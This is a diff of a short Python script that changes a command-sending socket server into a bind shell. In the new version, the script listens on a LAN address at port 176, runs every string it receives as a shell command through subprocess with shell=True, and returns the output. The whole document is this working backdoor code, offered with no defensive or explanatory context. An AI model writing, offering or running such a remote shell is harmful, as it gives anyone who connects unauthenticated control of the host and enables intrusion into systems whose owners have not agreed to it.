@@ -1,24 +1,28 @@
 import socket
+import subprocess
 
-HOST = '127.0.0.1'
-PORT = 176
+HOST = "192.168.0.111"
+PORT = 176  
 
-s = socket.socket()
-s.bind((HOST, PORT))
-
-print('[+] Start Serve')
-print('[+] Wainting Connection')
-s.listen(1)
-client, client_addr = s.accept()
-print(f'[+] {client_addr} Connect to the serve')
-
-while True:
-    command = input('Enter Command:')
-    client.send(bytes(str(command), 'utf-8'))
-    if command == 'd-':
-        print('End Connection')
-        exit()
-    print('[+] Command Send')
-    #output = client.recv(1024)
-    #output = client.decode(encoding='utf-8')
-    #print(f'Output: {output}')
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+    s.bind((HOST, PORT))
+    s.listen()
+    print('[+] Server Started')
+    print('[+] Listening For Client Connection ...')
+    conn, addr = s.accept()
+    conn.sendall(b'Conectado')
+    with conn:
+        print(f"[+] Connected by {addr}")
+        while True:
+            data = conn.recv(2048)
+            command = data.decode('utf-8')
+            if command == 'd-':
+                print('Cancelando conexão')
+                break
+            op = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+            file = op.stdout.read()
+            outpt = file.decode("latin1")
+            output = outpt
+            output_error = op.stderr.read()
+            conn.sendall(output.encode() + output_error)
+                
